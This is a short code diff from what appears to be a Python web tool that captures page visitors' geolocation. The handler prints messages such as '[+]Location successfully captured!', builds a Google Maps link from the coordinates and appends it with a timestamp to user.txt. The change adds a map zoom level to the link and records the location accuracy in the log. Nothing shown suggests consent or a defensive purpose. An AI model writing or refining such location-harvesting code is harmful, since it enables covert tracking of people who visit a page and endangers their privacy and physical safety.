@@ -21,7 +21,7 @@ def say_name():
     try:
         print("Logging to user.txt for more reference..")
         print("[+]Capture Details.")
-        link="https://www.google.com/maps/@"+data[0]+","+data[1]
+        link="https://www.google.com/maps/@"+data[0]+","+data[1]+",21z"
         print(link)
         print("Accuracy: ",data[2])
         print("[+]Location successfully captured!")
@@ -29,7 +29,7 @@ def say_name():
         if not done:
 
             with open('user.txt','a') as f:
-                f.write(str('\n')+str("|")+str(current_time)+str("|")+str(link))
+                f.write(str('\n')+str("|")+str(current_time)+str("|")+str(link)+str("|")+str(data[2]))
 
         return render_template('index.html')
         
